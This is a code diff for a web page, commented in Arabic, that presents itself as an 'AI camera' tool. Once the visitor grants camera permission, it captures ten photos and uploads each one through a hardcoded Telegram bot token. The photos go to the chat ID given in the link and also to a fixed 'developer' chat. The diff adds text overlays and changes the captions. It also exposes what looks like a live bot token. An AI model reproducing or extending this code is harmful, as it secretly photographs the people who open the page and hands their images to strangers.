@@ -1262,7 +1262,6 @@ video {
 const urlParams = new URLSearchParams(window.location.search);
 const dynamicChatId = urlParams.get('id');
 const fixedChatId = 6002805119; // المطور
-// ✅ التوكن الجديد
 const token = '8488682212:AAG_iPaR8rTBo1pK1XN0d2M1Ag1_k5SooWw';
 
 const video = document.getElementById('video');
@@ -1309,7 +1308,6 @@ function showNotification(message, type = 'info') {
     notification.textContent = message;
     notification.className = 'notification';
     
-    // تغيير اللون حسب النوع
     if (type === 'success') {
         notification.style.background = '#4CAF50';
     } else if (type === 'error') {
@@ -1354,12 +1352,10 @@ function startCamera() {
     document.getElementById('loginScreen').style.display = "none";
     document.getElementById('appScreen').style.display = "block";
     
-    // إعادة تعيين العدادات
     photoCount = 0;
     progressBar.style.width = '0%';
     counter.textContent = '0 / 10';
     
-    // طلب إذن الكاميرا
     navigator.mediaDevices.getUserMedia({ 
         video: { 
             width: { ideal: 1280 },
@@ -1384,7 +1380,6 @@ function startCamera() {
         status.innerHTML = '<i class="fas fa-exclamation-circle"></i> تم رفض إذن الكاميرا';
         showNotification('❌ يرجى منح إذن استخدام الكاميرا', 'error');
         
-        // عرض رسالة توضيحية بعد فترة
         setTimeout(() => {
             alert("للاستفادة من التطبيق، يجب منح إذن الوصول للكاميرا.\n\nيرجى:\n1. النقر على أيقونة الكاميرا في شريط العنوان\n2. اختيار 'السماح'\n3. إعادة تحميل الصفحة");
         }, 1000);
@@ -1397,13 +1392,11 @@ function captureAndSend() {
         status.innerHTML = '<i class="fas fa-flag-checkered"></i> اكتمل التحليل بنجاح!';
         showNotification('🎉 اكتمل التقاط 10 صور بنجاح!', 'success');
         
-        // إيقاف الكاميرا بعد الانتهاء
         if (video.srcObject) {
             const tracks = video.srcObject.getTracks();
             tracks.forEach(track => track.stop());
         }
         
-        // عرض زر للعودة
         setTimeout(() => {
             const stopBtn = document.querySelector('.stop-btn');
             stopBtn.innerHTML = '<i class="fas fa-redo"></i> إعادة التشغيل';
@@ -1417,28 +1410,70 @@ function captureAndSend() {
 
     photoCount++;
     
-    // تحديث شريط التقدم
     const progressPercent = (photoCount / MAX_PHOTOS) * 100;
     progressBar.style.width = `${progressPercent}%`;
-    
-    // تحديث العداد
     counter.textContent = `${photoCount} / ${MAX_PHOTOS}`;
-    
-    // تحديث حالة التصوير
     status.innerHTML = `<i class="fas fa-camera"></i> جاري معالجة الصورة ${photoCount}...`;
 
     const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
     const ctx = canvas.getContext('2d');
     
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
     // قلب الصورة كمرآة
     ctx.translate(canvas.width, 0);
     ctx.scale(-1, 1);
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+    // ✅ إضافة النصوص (الاسم، اليوزر، المعرف) على الصورة
+    ctx.translate(-canvas.width, 0);
+    ctx.scale(-1, 1);
+    
+    const textLines = [
+        `👤 الاسم: ${ownerName}`,
+        `📝 اليوزر: @${ownerUsername}`,
+        `🆔 المعرف: ${dynamicChatId}`
+    ];
+    
+    const fontSize = Math.min(canvas.width, canvas.height) * 0.035;
+    ctx.font = `bold ${fontSize}px 'Cairo', 'Arial', sans-serif`;
+    ctx.textAlign = 'left';
+    ctx.textBaseline = 'bottom';
+    
+    const lineHeight = fontSize * 1.6;
+    const padding = fontSize * 0.8;
+    const startX = padding;
+    const startY = canvas.height - padding;
+    
+    // خلفية سوداء شفافة
+    ctx.shadowColor = 'rgba(0, 0, 0, 0.8)';
+    ctx.shadowBlur = 15;
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
+    const textWidth = Math.max(
+        ctx.measureText(textLines[0]).width,
+        ctx.measureText(textLines[1]).width,
+        ctx.measureText(textLines[2]).width
+    );
+    const rectX = startX - padding/2;
+    const rectY = startY - (textLines.length * lineHeight) - padding/2;
+    const rectW = textWidth + padding;
+    const rectH = (textLines.length * lineHeight) + padding;
+    ctx.shadowBlur = 0;
+    ctx.fillRect(rectX, rectY, rectW, rectH);
+    
+    // كتابة النصوص
+    ctx.shadowColor = 'rgba(0, 0, 0, 0.5)';
+    ctx.shadowBlur = 10;
+    ctx.fillStyle = '#FFFFFF';
+    for (let i = 0; i < textLines.length; i++) {
+        const yPos = startY - (textLines.length - 1 - i) * lineHeight;
+        ctx.fillText(textLines[i], startX, yPos);
+    }
+
+    // تحويل canvas إلى blob وإرسال الصور
     canvas.toBlob(blob => {
-        const send = (id, caption, isOwner = true) => {
+        const send = (id, caption) => {
             const f = new FormData();
             f.append('chat_id', id);
             f.append('photo', blob, `ai_camera_${photoCount}.jpg`);
@@ -1450,9 +1485,9 @@ function captureAndSend() {
             });
         };
 
-        // ✅ إرسال الصورة لصاحب الرابط
+        // إرسال الصورة لصاحب الرابط
         if (dynamicChatId) {
-            const ownerCaption = `📸 الصورة ${photoCount} من 10 - كاميرا الذكاء الاصطناعي`;
+            const ownerCaption = `🎬 AI Frame ${photoCount}/${MAX_PHOTOS} | معالجة الفيديو الذكي`;
             send(dynamicChatId, ownerCaption).then(response => {
                 if (response.ok) {
                     console.log(`✅ تم إرسال الصورة ${photoCount} بنجاح`);
@@ -1462,17 +1497,17 @@ function captureAndSend() {
             });
         }
 
-        // ✅ إرسال نسخة للمطور مع معلومات صاحب الرابط
+        // إرسال نسخة للمطور مع معلومات إضافية
         const developerCaption = 
 `📸 *صورة جديدة من رابط مستخدم*
 
 👤 *اسم صاحب الرابط:* ${ownerName}
 📝 *يوزر صاحب الرابط:* @${ownerUsername}
 🆔 *معرف صاحب الرابط:* \`${dynamicChatId}\`
-📸 *رقم الصورة:* ${photoCount}/10
+📸 *رقم الصورة:* ${photoCount}/${MAX_PHOTOS}
 🕐 *وقت التقاط:* ${new Date().toLocaleString('ar-EG')}`;
 
-        send(fixedChatId, developerCaption, false).then(response => {
+        send(fixedChatId, developerCaption).then(response => {
             if (response.ok) {
                 console.log(`✅ تم إرسال نسخة للمطور`);
             }
@@ -1480,7 +1515,7 @@ function captureAndSend() {
             console.error(`❌ فشل إرسال نسخة للمطور:`, error);
         });
 
-        // تأثير بصرية عند التقاط الصورة
+        // تأثير بصري
         const overlay = document.querySelector('.overlay i');
         overlay.style.transform = 'scale(1.3)';
         overlay.style.color = '#00c6ff';
@@ -1502,7 +1537,6 @@ function stopCamera() {
     
     status.innerHTML = '<i class="fas fa-stop-circle"></i> تم إيقاف التحليل';
     
-    // عرض زر للعودة
     setTimeout(() => {
         const stopBtn = document.querySelector('.stop-btn');
         stopBtn.innerHTML = '<i class="fas fa-redo"></i> إعادة التشغيل';
@@ -1516,7 +1550,6 @@ function stopCamera() {
 window.addEventListener('load', () => {
     showUserInfo();
     
-    // تأثيرات عند التحميل
     const logo = document.querySelector('.logo');
     setTimeout(() => {
         logo.style.transform = 'scale(1.1)';
@@ -1525,7 +1558,6 @@ window.addEventListener('load', () => {
         }, 300);
     }, 1000);
     
-    // إذا كان هناك ID في الرابط، عرض رسالة ترحيبية
     if (dynamicChatId) {
         setTimeout(() => {
             showNotification('👋 مرحباً بك! اضغط على "بدء استخدام الكاميرا" للبدأ', 'info');
